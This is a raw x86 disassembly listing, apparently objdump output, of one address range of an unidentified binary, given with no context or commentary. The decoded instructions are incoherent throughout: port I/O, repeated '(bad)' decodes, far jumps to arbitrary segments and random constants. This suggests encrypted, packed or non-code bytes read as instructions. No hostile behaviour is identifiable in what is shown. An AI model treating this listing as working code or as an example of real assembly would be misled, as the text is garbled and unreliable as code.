  413020:	or     edx,DWORD PTR gs:[edi]
  413023:	stc    
  413024:	ja     0x41301c
  413026:	jns    0x412fb0
  413028:	jp     0x412fde
  41302a:	sub    eax,0x24eb0538
  41302f:	fisub  WORD PTR [edx]
  413031:	std    
  413032:	jge    0x4130a4
  413034:	mov    ds:0x7f72a8c0,al
  413039:	jns    0x41307d
  41303b:	adc    DWORD PTR [edi],ebp
  41303d:	stos   DWORD PTR es:[edi],eax
  41303e:	lock inc edx
  413040:	repz in eax,dx
  413042:	push   edi
  413043:	in     eax,dx
  413044:	xor    DWORD PTR [eax],esi
  413046:	xchg   edi,eax
  413047:	shl    eax,1
  413049:	fidivr DWORD PTR [ecx]
  41304b:	cwde   
  41304c:	adc    cl,ah
  41304e:	aad    0xc5
  413050:	in     eax,dx
  413051:	retf   0xdc6f
  413054:	mov    ebp,0xec5dfa35
  413059:	mov    dl,0x44
  41305b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41305c:	push   ds
  41305d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41305e:	cdq    
  41305f:	aaa    
  413060:	sub    BYTE PTR [edi+0x4c],0xaa
  413064:	sahf   
  413065:	out    dx,eax
  413066:	pop    ebx
  413067:	dec    eax
  413068:	ret    
  413069:	mov    ecx,0xb90ac823
  41306e:	xor    al,0xa4
  413070:	sar    DWORD PTR [edx-0x7],0xed
  413074:	or     dh,al
  413076:	dec    eax
  413077:	pop    es
  413078:	lds    eax,FWORD PTR [edi-0x22]
  41307b:	fnstsw WORD PTR [esi+0x3887361c]
  413081:	clc    
  413082:	adc    BYTE PTR [ebx+0x1d37420],0x1d
  413089:	mov    al,0xe2
  41308b:	xor    BYTE PTR [edx-0xd],bh
  41308e:	adc    bh,BYTE PTR [ecx-0x54]
  413091:	lods   eax,DWORD PTR ds:[esi]
  413092:	out    dx,eax
  413093:	sbb    DWORD PTR [ecx+0x12],esi
  413096:	cld    
  413097:	inc    ebp
  413098:	rol    BYTE PTR [ebp+0x2b],1
  41309b:	bound  esp,QWORD PTR [eax+eax*8-0x3a]
  41309f:	stos   DWORD PTR es:[edi],eax
  4130a0:	jmp    0x413055
  4130a2:	and    eax,0x9c849539
  4130a7:	enter  0x6b41,0x93
  4130ab:	cdq    
  4130ac:	mov    dl,BYTE PTR [eax+ebp*8-0x21]
  4130b0:	adc    eax,esp
  4130b2:	or     ch,bl
  4130b4:	mov    edi,DWORD PTR [edi]
  4130b6:	cwde   
  4130b7:	add    ah,al
  4130b9:	jmp    0x4130f4
  4130bb:	test   cl,bh
  4130bd:	pop    esi
  4130be:	lss    esi,FWORD PTR [edx]
  4130c1:	pop    eax
  4130c2:	xchg   BYTE PTR [ebp-0xa],bh
  4130c5:	pusha  
  4130c6:	fwait
  4130c7:	mov    edi,0x935e4f58
  4130cc:	push   ebp
  4130cd:	aad    0x58
  4130cf:	pop    edx
  4130d0:	mov    bl,0xfd
  4130d2:	jns    0x41305b
  4130d4:	mov    bl,0x30
  4130d6:	lahf   
  4130d7:	shr    DWORD PTR [esi-0x43],0xfd
  4130db:	mov    DWORD PTR [ebx+0x1b],0x9e10a290
  4130e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130e3:	push   0x106bd1fb
  4130e8:	popa   
  4130e9:	(bad)  
  4130ea:	jmp    0x87a7:0xea1c3c4f
  4130f1:	jo     0x41314f
  4130f3:	shl    DWORD PTR [ebp+0x52],cl
  4130f6:	mov    esi,0xeecfa2cd
  4130fb:	adc    DWORD PTR [esi],edi
  4130fd:	and    ebx,DWORD PTR [edi+edi*8+0x781d8023]
  413104:	ins    BYTE PTR es:[edi],dx
  413105:	pop    edi
  413106:	loope  0x4130a9
  413108:	outs   dx,DWORD PTR ds:[esi]
  413109:	jp     0x41316c
  41310b:	out    0x85,al
  41310d:	sub    eax,0xa4a2bd19
  413112:	xor    al,0x3c
  413114:	out    dx,al
  413115:	xchg   esi,esi
  413117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413118:	mov    eax,0xf30f6190
  41311d:	bound  edi,QWORD PTR [eax+0x69542b56]
  413123:	mov    ds:0x7ea18e34,al
  413128:	pop    esi
  413129:	mul    BYTE PTR [eax-0x3db98a46]
  41312f:	adc    DWORD PTR [edi-0x1113201b],esi
  413135:	addr16 pop ebp
  413137:	ret    
  413138:	leave  
  413139:	push   esi
  41313a:	sti    
  41313b:	in     al,dx
  41313c:	outs   dx,DWORD PTR ds:[esi]
  41313d:	mov    esi,0x615bf693
  413142:	in     eax,0xce
  413144:	inc    eax
  413145:	sub    BYTE PTR [edx],cl
  413147:	js     0x41311e
  413149:	mov    ?,WORD PTR ds:0x589c1f7a
  41314f:	lea    esi,[eax-0x6afc15e]
  413155:	dec    ecx
  413156:	aad    0x91
  413158:	outs   dx,BYTE PTR ds:[esi]
  413159:	jmp    0x9c7d:0x77973f8f
  413160:	xor    al,0x6
  413162:	mov    ecx,0xb5d75e06
  413167:	mov    WORD PTR [eax-0xd],si
  41316b:	sti    
  41316c:	popf   
  41316d:	shr    ah,cl
  41316f:	fwait
  413170:	mov    edi,esp
  413172:	adc    edx,DWORD PTR [edx+ecx*1+0x2841ae1c]
  413179:	push   ecx
  41317a:	push   edx
  41317b:	retf   
  41317c:	xchg   edx,eax
  41317d:	sbb    al,BYTE PTR [ecx]
  41317f:	cwde   
  413180:	jge    0x41313e
  413182:	or     eax,0x87af787b
  413187:	adc    eax,0x68ecf50e
  41318c:	adc    esi,DWORD PTR [eax-0x2942a95]
  413192:	and    BYTE PTR [ebx-0x2e],0x8a
  413196:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  413198:	into   
  413199:	lods   al,BYTE PTR ds:[esi]
  41319a:	cli    
  41319b:	call   0xfebebecb
  4131a0:	mov    esp,?
  4131a2:	cli    
  4131a3:	dec    edi
  4131a4:	aas    
  4131a5:	xor    BYTE PTR [ebp-0x2b3b4790],0x7d
  4131ac:	add    eax,0xb379e097
  4131b1:	bound  ecx,QWORD PTR [edx+0x68ccbc24]
  4131b7:	dec    edx
  4131b8:	jns    0x4131dd
  4131ba:	cwde   
  4131bb:	cmp    BYTE PTR [ebx],dl
  4131bd:	shl    DWORD PTR [edx],1
  4131bf:	adc    al,0xf8
  4131c1:	icebp  
  4131c2:	imul   edi,DWORD PTR [ebx],0x19
  4131c5:	enter  0xf05d,0x2d
  4131c9:	xor    al,0x40
  4131cb:	xor    al,0xba
  4131cd:	repz inc edi
  4131cf:	and    cl,ch
  4131d1:	daa    
  4131d2:	add    DWORD PTR [esi-0x36c98bfc],ebx
  4131d8:	xchg   DWORD PTR [ecx],edx
  4131da:	mov    esp,0x4511feed
  4131df:	dec    ebx
  4131e0:	cld    
  4131e1:	push   ecx
  4131e2:	sti    
  4131e3:	and    BYTE PTR [edx],0x40
  4131e6:	sar    esp,0x6
  4131e9:	in     al,0xc0
  4131eb:	es pop eax
  4131ed:	or     esi,DWORD PTR [ebx+0x1a]
  4131f0:	inc    edi
  4131f1:	dec    ecx
  4131f2:	ds lock test edi,ebp
  4131f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131f7:	hlt    
  4131f8:	mov    ?,WORD PTR [esi+0x29]
  4131fb:	cmp    eax,0xf5ee28b0
  413200:	lahf   
  413201:	xor    BYTE PTR [ebp+0x5d],ah
  413204:	mov    bh,0x63
  413206:	jl     0x41324c
  413208:	pop    ds
  413209:	mov    cl,al
  41320b:	xchg   ebx,ebx
  41320d:	pop    esi
  41320e:	stc    
  41320f:	pop    es
  413210:	add    al,0x57
  413212:	fwait
  413213:	imul   esp,edx,0xdfe10049
  413219:	sar    BYTE PTR [ecx],cl
  41321b:	aaa    
  41321c:	sub    al,BYTE PTR [eax]
  41321e:	std    
  41321f:	or     dh,BYTE PTR [eax+ebx*8-0x796d1bba]
  413226:	repnz dec edx
  413228:	(bad)  
  41322a:	nop
  41322b:	in     al,dx
  41322c:	pop    ecx
  41322d:	imul   edx,DWORD PTR [eax],0xffffff87
  413230:	(bad)
  413234:	gs sti 
  413236:	enter  0xc646,0x9a
  41323a:	jmp    0x362a2152
  41323f:	retf   
  413240:	iret   
  413241:	repnz mov al,0xc
  413244:	add    al,0x63
  413246:	out    dx,al
  413247:	or     eax,0x1aa4d882
  41324c:	sti    
  41324d:	enter  0xf465,0x50
  413251:	outs   dx,BYTE PTR ds:[esi]
  413252:	mov    ebx,0xc4ac9e3d
  413257:	push   ebp
  413258:	pop    esp
  413259:	repnz mov edx,0x83857721
  41325f:	fstp   st(1)
  413261:	inc    esp
  413262:	and    al,0x54
  413264:	push   ecx
  413265:	mov    esp,edx
  413267:	and    eax,0x7fddd9d8
  41326c:	cwde   
  41326d:	pop    edx
  41326e:	xchg   BYTE PTR [ecx],al
  413270:	ins    DWORD PTR es:[edi],dx
  413271:	dec    ebx
  413272:	test   bl,bl
  413274:	cmp    DWORD PTR [edi+0x35],eax
  413277:	mov    esp,DWORD PTR [edx]
  413279:	mov    bh,0xab
  41327b:	ja     0x4132ab
  41327d:	and    dl,BYTE PTR [edi+eiz*1-0x26c3b1c5]
  413284:	cdq    
  413285:	push   ecx
  413286:	inc    esp
  413287:	cld    
  413288:	sbb    esp,DWORD PTR ds:0x2c65a7d4
  41328e:	jns    0x413220
  413290:	push   eax
  413291:	es jb  0x4132b1
  413294:	sbb    DWORD PTR [eax],edi
  413296:	int3   
  413297:	sbb    ebp,ebx
  413299:	(bad)
  41329d:	in     al,0x79
  41329f:	in     eax,0xa4
  4132a1:	mov    ds:0x1971c7b4,eax
  4132a6:	icebp  
  4132a7:	mov    esp,0x209aa093
  4132ac:	xor    al,0xc5
  4132ae:	mov    ch,0xc8
  4132b0:	mov    ch,0x48
  4132b2:	xchg   ebx,eax
  4132b3:	dec    eax
  4132b4:	jns    0x413258
  4132b6:	cmp    ah,BYTE PTR [ebx+ebp*4-0x35c95c0f]
  4132bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132be:	les    edx,FWORD PTR fs:[ecx]
  4132c1:	pop    edi
  4132c2:	mov    ds:0xe446123d,al
  4132c7:	sahf   
  4132c8:	xor    bl,BYTE PTR [ebp+0x31]
  4132cb:	daa    
  4132cc:	iret   
  4132cd:	xchg   esp,eax
  4132ce:	push   esp
  4132cf:	jns    0x413295
  4132d1:	cmc    
  4132d2:	adc    BYTE PTR [edx],dl
  4132d4:	xor    cl,dh
  4132d6:	lods   al,BYTE PTR ds:[esi]
  4132d7:	and    bh,ah
  4132d9:	mov    ecx,edx
  4132db:	dec    eax
  4132dc:	ja     0x4132f3
  4132de:	gs ds jmp 0x41326c
  4132e2:	jmp    0x3bb869ef
  4132e7:	xchg   ebx,eax
  4132e8:	fsubp  st(3),st
  4132ea:	mov    esp,0xd39379c1
  4132ef:	mov    bh,0xeb
  4132f1:	mov    esi,0xada1da66
  4132f6:	das    
  4132f7:	lea    edx,[edx-0x1]
  4132fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132fb:	imul   esi,eax,0x61180e14
  413301:	fldcw  WORD PTR [esi]
  413303:	inc    esi
  413304:	adc    al,0xa0
  413306:	jb     0x4132d4
  413308:	mov    cl,0x28
  41330a:	or     BYTE PTR [esi+0x31bba6f8],ch
  413310:	add    BYTE PTR [edx+0x4cf6ee6],bh
  413316:	call   0x26469a5e
  41331b:	in     al,0x5b
  41331d:	mov    edi,0x9327864e
  413322:	pop    ds
  413323:	cmp    DWORD PTR [ecx+0xa],ebx
  413326:	loop   0x4132fe
  413328:	lods   al,BYTE PTR ds:[esi]
  413329:	test   DWORD PTR [edx-0x5f7e7662],ebp
  41332f:	test   al,0xaf
  413331:	ins    DWORD PTR es:[edi],dx
  413332:	fcom   QWORD PTR [ecx-0x1]
  413335:	nop
  413336:	push   DWORD PTR [ecx-0x301ac0e2]
  41333c:	aaa    
  41333d:	jno    0x4132cb
  41333f:	mov    BYTE PTR [edx-0x4e],dh
  413342:	mov    ds:0x19330d6f,al
  413347:	sbb    DWORD PTR [edx+0x7c],0xfffffffc
  41334b:	mov    cl,0xdf
  41334d:	ins    BYTE PTR es:[edi],dx
  41334e:	sar    BYTE PTR [eax-0x4533cef3],cl
  413354:	push   esi
  413355:	add    al,0xdc
  413357:	mov    dh,cl
  413359:	neg    BYTE PTR [edx+0x7e824b8d]
  41335f:	sbb    ebp,DWORD PTR [edx*4-0x432b9a6d]
  413366:	inc    ecx
  413367:	jg     0x413390
  413369:	mov    ch,BYTE PTR [eax+0x71]
  41336c:	in     eax,dx
  41336d:	repnz inc eax
  41336f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413370:	fcos   
  413372:	cdq    
  413373:	popa   
  413374:	aam    0xe2
  413376:	rol    DWORD PTR [ebx-0x5a120c9b],cl
  41337c:	shl    eax,1
  41337e:	dec    ebp
  41337f:	sbb    BYTE PTR [eax+edx*4],al
  413382:	popa   
  413383:	dec    esp
  413384:	sub    DWORD PTR [esi+0x5],esp
  413387:	(bad)  
  413388:	mov    ch,0x1e
  41338a:	hlt    
  41338b:	ror    DWORD PTR [edx],0x3c
  41338e:	mov    BYTE PTR [edi+0x61f1d9da],dl
  413394:	inc    eax
  413395:	(bad)  
  413396:	shl    DWORD PTR [eax],1
  413398:	ins    BYTE PTR es:[edi],dx
  413399:	jle    0x41336b
  41339b:	mov    ebx,0x348619a
  4133a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133a1:	inc    eax
  4133a2:	mov    esp,0x2d71cf12
  4133a7:	xchg   edi,eax
  4133a8:	add    ch,BYTE PTR [edx-0x4615e040]
  4133ae:	lods   al,BYTE PTR ds:[esi]
  4133af:	sahf   
  4133b0:	sti    
  4133b1:	ss cli 
  4133b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133b4:	pop    eax
  4133b5:	rol    esp,1
  4133b7:	dec    esi
  4133b8:	popa   
  4133b9:	outs   dx,BYTE PTR ds:[esi]
  4133ba:	out    dx,al
  4133bb:	pop    esp
  4133bc:	cmp    BYTE PTR [edx+0x15e63501],0x4a
  4133c3:	dec    edx
  4133c4:	sbb    BYTE PTR [edx],cl
  4133c6:	pop    edi
  4133c7:	sub    al,0xe0
  4133c9:	add    al,0x68
  4133cb:	imul   ebx,DWORD PTR [edx],0x892e1394
  4133d1:	mov    al,ds:0xea91223a
  4133d6:	je     0x4133a2
  4133d8:	adc    ah,BYTE PTR [ecx+0x7f]
  4133db:	jmp    0x4133f1
  4133dd:	or     ebx,DWORD PTR [ebx-0x58]
  4133e0:	out    dx,al
  4133e1:	pop    ebp
  4133e2:	je     0x413446
  4133e4:	xchg   edx,eax
  4133e5:	(bad)  
  4133e6:	jns    0x413399
  4133e8:	xchg   BYTE PTR [edi+0x7f45effd],ch
  4133ee:	xchg   BYTE PTR [ecx-0x3a],cl
  4133f1:	inc    esp
  4133f2:	ret    
  4133f3:	repnz shr DWORD PTR [ecx+0x7f2f51b9],1
  4133fa:	shl    BYTE PTR [ebp+0x2d],1
  4133fd:	retf   
  4133fe:	push   esi
  4133ff:	or     eax,0xa680c522
  413404:	sub    BYTE PTR [edx-0x9],ch
  413407:	sti    
  413408:	cmp    BYTE PTR [edi-0x5f1bfa5a],0x65
  41340f:	push   eax
  413410:	lahf   
  413411:	mov    ch,BYTE PTR [ebp-0x1e52ac12]
  413417:	cmp    eax,0x5ea6a762
  41341c:	jo     0x413464
  41341e:	mov    al,0xb7
  413420:	cli    
  413421:	xor    DWORD PTR [ebx-0x44],esi
  413424:	lock sahf 
  413426:	cmp    bh,ch
  413428:	lea    ecx,[eax+eiz*1-0x77]
  41342c:	dec    esp
  41342d:	sbb    dl,BYTE PTR [edi-0x5ebbdbb2]
  413433:	scas   eax,DWORD PTR es:[edi]
  413434:	add    BYTE PTR [ebx],ch
  413436:	pop    eax
  413437:	cld    
  413438:	(bad)  
  413439:	mov    ch,0xb0
  41343b:	xor    DWORD PTR [edi-0x26eb66e9],0x2bd20c60
  413445:	nop
  413446:	add    edx,esi
  413448:	aas    
  413449:	fstp   QWORD PTR [edi+0x3a]
  41344c:	cmp    al,bl
  41344e:	cmp    ah,dl
  413450:	and    bh,ch
  413452:	cmp    bh,BYTE PTR [edi]
  413454:	je     0x4134cb
  413456:	cmp    DWORD PTR [ecx+0x1d0f9ae],esi
  41345c:	fimul  DWORD PTR [ecx+0x4b]
  41345f:	push   edi
  413460:	scas   eax,DWORD PTR es:[edi]
  413461:	pop    eax
  413462:	into   
  413463:	test   esp,edi
  413465:	inc    ebp
  413466:	int    0xd7
  413468:	cdq    
  413469:	dec    cx
  41346b:	push   cs
  41346c:	fisub  WORD PTR [edx]
  41346e:	pushf  
  41346f:	xchg   edx,eax
  413470:	pop    edi
  413471:	push   esi
  413472:	inc    edi
  413473:	or     ah,bl
  413475:	mov    eax,ds:0x4afc8a16
  41347a:	(bad)  
  41347b:	mov    edi,0xc59c1ce4
  413480:	add    DWORD PTR [esi-0x67],0x27
  413484:	imul   ecx,edi,0x73705b8a
  41348a:	sub    al,0x83
  41348c:	xor    eax,0xc2bd293a
  413491:	push   ebx
  413492:	dec    edi
  413493:	add    al,0xe6
  413495:	mov    ds:0xc491e3f2,eax
  41349a:	fcmovu st,st(4)
  41349c:	fnstcw WORD PTR [edi+ebx*1+0x188dd5c8]
  4134a3:	push   ss
  4134a4:	aam    0x3e
  4134a6:	xchg   ecx,eax
  4134a7:	scas   eax,DWORD PTR es:[edi]
  4134a8:	dec    ebx
  4134a9:	aaa    
  4134aa:	das    
  4134ab:	not    DWORD PTR [edx+0x3fb909a3]
  4134b1:	mov    al,0xb2
  4134b3:	aaa    
  4134b4:	jo     0x4134fa
  4134b6:	or     DWORD PTR [edi+0x5ac80655],eax
  4134bc:	xchg   esi,eax
  4134bd:	dec    bp
  4134bf:	inc    ebp
  4134c0:	pop    es
  4134c1:	xlat   BYTE PTR ds:[ebx]
  4134c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4134c3:	jae    0x4134b8
  4134c5:	fnsave [esi+0x335e41a]
  4134cb:	cmp    eax,0x5ab0b0b2
  4134d0:	push   ecx
  4134d1:	and    eax,0x4eca3331
  4134d7:	sub    ebx,DWORD PTR ds:0x44a3a485
  4134dd:	out    dx,eax
  4134de:	push   0x15
  4134e0:	inc    ebp
  4134e1:	dec    ebp
  4134e2:	popf   
  4134e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134e4:	fnsave [ecx]
  4134e6:	(bad)  
  4134e7:	mov    bl,0x19
  4134e9:	add    al,0x70
  4134eb:	cli    
  4134ec:	lock adc al,0xb6
  4134ef:	mov    edi,DWORD PTR [ebx]
  4134f1:	mov    DWORD PTR [esi-0x665d197],ecx
  4134f7:	loop   0x413568
  4134f9:	test   eax,0x286b08ed
  4134fe:	fld    st(7)
  413500:	xor    DWORD PTR [eax],edx
  413502:	sbb    DWORD PTR [edi],ebx
  413504:	push   ebx
  413505:	(bad)  
  413506:	out    dx,eax
  413507:	sbb    eax,0x36e8c6fe
  41350c:	fs leave 
  41350e:	jnp    0x413491
  413510:	jns    0x413553
  413512:	cmp    al,0x8
  413514:	sub    DWORD PTR [eax+0xb798f71],eax
  41351a:	mul    BYTE PTR [eax+0x4a]
  41351d:	js     0x413510
  41351f:	mov    dh,cl
  413521:	jle    0x413596
  413523:	lods   eax,DWORD PTR ds:[esi]
  413524:	lock leave 
  413526:	xchg   esi,eax
  413527:	adc    al,0x11
  413529:	lahf   
  41352a:	retf   
  41352b:	cld    
  41352c:	inc    ebx
  41352d:	or     bl,BYTE PTR [esi-0x78]
  413530:	sbb    ch,bh
  413532:	and    esi,DWORD PTR [ecx+edx*4-0x47d942a6]
  413539:	mov    ds:0xa07cb971,eax
  41353e:	push   ss
  41353f:	arpl   WORD PTR [esi+0x76],cx
  413542:	test   al,0x2a
  413544:	adc    al,0x50
  413546:	mov    edx,0x7aa067ef
  41354b:	push   ebx
  41354c:	xor    al,0x9d
  41354e:	dec    ecx
  41354f:	dec    edi
  413550:	imul   ecx,DWORD PTR [edx],0x29a15881
  413556:	cmp    dl,ah
  413558:	retf   0xd00
  41355b:	or     esi,DWORD PTR [ebx]
  41355d:	int3   
  41355e:	xchg   ecx,eax
  41355f:	in     al,dx
  413560:	int    0xf6
  413562:	leave  
  413563:	fdiv   DWORD PTR ds:0x36b9f51e
  413569:	out    0x1c,eax
  41356b:	ror    BYTE PTR [eax+0x61dc659f],1
  413571:	out    dx,eax
  413572:	dec    ecx
  413573:	mov    esp,0xa3677749
  413578:	jns    0x4135cc
  41357a:	sti    
  41357b:	inc    esp
  41357c:	ret    
  41357d:	addr16 icebp 
  41357f:	ss xchg ebx,eax
  413581:	dec    edi
  413582:	pop    ebx
  413583:	lea    edi,[ebx-0x6]
  413586:	mov    esp,0x9190b46b
  41358b:	push   esp
  41358c:	push   ebp
  41358d:	sbb    al,0x62
  41358f:	jne    0x4135ce
  413591:	xor    DWORD PTR [ecx+eiz*1+0x4b],ebp
  413595:	loope  0x41358b
  413597:	jle    0x4135c2
  413599:	clc    
  41359a:	je     0x41352a
  41359c:	dec    ebx
  41359d:	test   DWORD PTR [ebp+0x6fc1e4c6],eax
  4135a3:	and    al,0x34
  4135a5:	add    esi,DWORD PTR [edx]
  4135a7:	arpl   bp,cx
  4135a9:	jmp    0x413544
  4135ab:	imul   edi,DWORD PTR [ecx+0x22],0x8aa776a2
  4135b2:	sub    eax,0xed020275
  4135b7:	outs   dx,DWORD PTR ds:[esi]
  4135b8:	mov    ebx,0xbb67fbc2
  4135bd:	les    esp,FWORD PTR [eax-0x4374c9b8]
  4135c3:	cmp    eax,0x68d63460
  4135c8:	xchg   DWORD PTR [edx],ebp
  4135ca:	adc    dl,ah
  4135cc:	push   esi
  4135cd:	push   ds
  4135ce:	or     eax,0x804a48aa
  4135d3:	dec    ebx
  4135d4:	dec    ebp
  4135d5:	pop    ebp
  4135d6:	fs out dx,al
  4135d8:	dec    ecx
  4135d9:	cmp    ebp,DWORD PTR [edx+0x2550c4c7]
  4135df:	xchg   edi,eax
  4135e0:	jg     0x4135db
  4135e2:	jae    0x41364c
  4135e4:	fs out dx,al
  4135e6:	add    BYTE PTR [ecx-0x5a],0x93
  4135ea:	arpl   WORD PTR [ecx+0xfbeefe0],si
  4135f0:	mov    cl,0x6f
  4135f2:	test   al,0xac
  4135f4:	xchg   ecx,eax
  4135f5:	fnstenv [edi]
  4135f7:	or     al,0x71
  4135f9:	loope  0x413604
  4135fb:	loopne 0x41362f
  4135fd:	push   DWORD PTR [ebx]
  4135ff:	test   eax,0xcc6aa513
  413604:	dec    esi
  413605:	xchg   ebp,eax
  413606:	xchg   ebx,eax
  413607:	test   eax,0xe4fafba6
  41360c:	pop    ecx
  41360d:	pushf  
  41360e:	cli    
  41360f:	(bad)  
  413610:	or     al,BYTE PTR [ebx+0x7e]
  413613:	sbb    DWORD PTR ds:0x489cb11d,edx
  413619:	retf   0x3d40
  41361c:	icebp  
  41361d:	push   esi
  41361e:	cmc    
  41361f:	lods   al,BYTE PTR ds:[esi]
  413620:	xchg   DWORD PTR [ebx-0x4fed57a8],eax
  413626:	add    bh,BYTE PTR [ecx+0xa]
  413629:	sub    dl,BYTE PTR [edi]
  41362b:	xchg   edi,eax
  41362c:	adc    BYTE PTR [esi],ch
  41362e:	mov    ds:0xd2c7108c,eax
  413633:	sahf   
  413634:	(bad)  
  413635:	xchg   esp,eax
  413636:	push   es
  413637:	(bad)  
  413638:	xchg   edx,eax
  413639:	inc    ebp
  41363a:	rcr    DWORD PTR [edi-0x2b],1
  41363d:	mov    ebp,0x51a73fe2
  413642:	lods   al,BYTE PTR ds:[esi]
  413643:	int    0x79
  413645:	xor    DWORD PTR [eax-0x26],ebp
  413648:	call   0x4ed2:0xd7a99a03
  41364f:	lods   al,BYTE PTR ds:[esi]
  413650:	pop    edx
  413651:	std    
  413652:	dec    ebp
  413653:	mov    dh,ch
  413655:	push   edx
  413656:	push   edx
  413657:	cli    
  413658:	(bad)  
  413659:	int    0x0
  41365b:	mov    esi,DWORD PTR [ecx-0x4936b174]
  413661:	or     al,0xc6
  413663:	repz mov edx,0xf02ea1c
  413669:	repz je 0x4136c1
  41366c:	add    bh,cl
  41366e:	jmp    0x4136a8
  413670:	cs fs sahf 
  413673:	inc    edx
  413674:	(bad)
  413678:	xchg   ebx,eax
  413679:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41367a:	stos   DWORD PTR es:[edi],eax
  41367b:	test   DWORD PTR [ebp-0x1c],0xd02a18f5
  413682:	out    0xbe,al
  413684:	ror    BYTE PTR [eax],1
  413686:	mov    ds:0x28b60a62,al
  41368b:	cmc    
  41368c:	shr    DWORD PTR [ecx-0x5b],0x7
  413690:	fstp   TBYTE PTR [ebx+0x14]
  413693:	xchg   edi,eax
  413694:	mov    WORD PTR [ecx],ss
  413696:	adc    DWORD PTR [esi-0x7a],eax
  413699:	xchg   DWORD PTR [esi-0x639932bf],ebp
  41369f:	mov    ah,0xb5
  4136a1:	retf   0xe6a4
  4136a4:	mov    WORD PTR [ebp+eax*1+0xd],es
  4136a8:	push   edi
  4136a9:	xchg   edi,eax
  4136aa:	lahf   
  4136ab:	push   esi
  4136ac:	xchg   esp,eax
  4136ad:	in     eax,0x3
  4136af:	mov    ds:0xa695db1b,eax
  4136b4:	sub    DWORD PTR [eax-0x1a8d256b],ecx
  4136ba:	or     BYTE PTR [edi],bh
  4136bc:	cmp    BYTE PTR [ebp+0x39],bl
  4136bf:	jne    0x413653
  4136c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136c2:	sub    BYTE PTR [edi-0xe],ah
  4136c5:	cmp    ebx,eax
  4136c7:	ror    ch,0xd
  4136ca:	push   es
  4136cb:	pushf  
  4136cc:	lods   al,BYTE PTR ds:[esi]
  4136cd:	mov    edi,0x24507a26
  4136d2:	jp     0x413667
  4136d4:	jmp    0x147:0x9dad4456
  4136db:	pop    esi
  4136dc:	imul   ebp,ebp,0xdd4561b4
  4136e2:	jge    0x413699
  4136e4:	dec    eax
  4136e5:	mov    bh,0xe6
  4136e7:	add    DWORD PTR [edi-0x38],0xf
  4136eb:	mov    ds:0x20b63def,eax
  4136f0:	push   edi
  4136f1:	xchg   ebx,eax
  4136f2:	icebp  
  4136f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136f4:	jp     0x41370d
  4136f6:	jmp    FWORD PTR [edx+0x5c35c4e6]
  4136fc:	in     al,dx
  4136fd:	pop    es
  4136fe:	std    
  4136ff:	or     BYTE PTR [ecx+0x1ce8ada4],ah
  413705:	mov    esi,0x7863aa97
  41370a:	repz test DWORD PTR [edx+0x66bcc67d],ebp
  413711:	dec    ebp
  413712:	jo     0x413764
  413714:	add    BYTE PTR [eax+eiz*2],dl
  413717:	out    0x15,al
  413719:	cwde   
  41371a:	mov    edx,0x8724a82a
  41371f:	or     BYTE PTR [ecx+0x133f2de7],dh
  413725:	mov    cl,0x92
  413727:	jp     0x4136aa
  413729:	loop   0x4136b3
  41372b:	and    ah,cl
  41372d:	jecxz  0x4136b4
  41372f:	add    al,0x83
  413731:	repnz pop ds
  413733:	add    dh,BYTE PTR [edi+edx*1+0x30]
  413737:	jo     0x41370a
  413739:	jge    0x413701
  41373b:	mov    esp,0x5afe3854
  413740:	and    BYTE PTR [eax+0x34],dh
  413743:	xchg   DWORD PTR [ebx],ebx
  413745:	jmp    0x413783
  413747:	xchg   ebp,eax
  413748:	jno    0x413740
  41374a:	cmp    al,BYTE PTR [ecx]
  41374c:	mov    ah,0x75
  41374e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41374f:	mov    dh,0x8f
  413751:	xchg   DWORD PTR [ebx+0x68b6be2d],ebp
  413757:	push   esi
  413758:	clc    
  413759:	test   DWORD PTR ds:0x87ac258b,esi
  41375f:	jp     0x413761
  413761:	lds    ebx,FWORD PTR [ebx+eax*1]
  413764:	icebp  
  413765:	inc    ebx
  413766:	out    0xa,eax
  413768:	out    dx,al
  413769:	push   0x9d510d29
  41376e:	push   ss
  41376f:	xor    esi,eax
  413771:	fs in  eax,dx
  413773:	das    
  413774:	icebp  
  413775:	dec    ebp
  413776:	mov    esp,0xe5b315c3
  41377b:	sbb    DWORD PTR [ebx+0x1faeea39],esi
  413781:	jecxz  0x4137da
  413783:	mov    ebp,0xa6375655
  413788:	push   ds
  413789:	lods   eax,DWORD PTR ds:[esi]
  41378a:	xlat   BYTE PTR ds:[ebx]
  41378b:	vunpckhps xmm6,xmm0,xmm2
  41378f:	cs into 
  413791:	mov    esp,0x78a4dd46
  413796:	ins    BYTE PTR es:[edi],dx
  413797:	sub    edx,eax
  413799:	cmp    esi,DWORD PTR [eax-0x10d250a7]
  41379f:	mov    esp,0x1f6ae57b
  4137a4:	out    dx,al
  4137a5:	call   0x3728:0x3b943b85
  4137ac:	int    0x18
  4137ae:	xor    esp,edx
  4137b0:	pop    eax
  4137b1:	loopne 0x413762
  4137b3:	sub    al,0xf3
  4137b5:	mov    ?,WORD PTR [esi-0x6c]
  4137b8:	aas    
  4137b9:	pop    esi
  4137ba:	std    
  4137bb:	inc    eax
  4137bc:	sub    edx,esp
  4137be:	add    DWORD PTR [edx+0x490548d3],0xffffff8a
  4137c5:	cli    
  4137c6:	into   
  4137c7:	pop    esi
  4137c8:	ret    0x66de
  4137cb:	jb     0x413798
  4137cd:	cmp    esp,ebx
  4137cf:	and    BYTE PTR [ebx+0xb],dh
  4137d2:	(bad)  
  4137d3:	fcomip st,st(7)
  4137d5:	jo     0x4137f7
  4137d7:	add    esi,DWORD PTR [esp+edi*8+0x38]
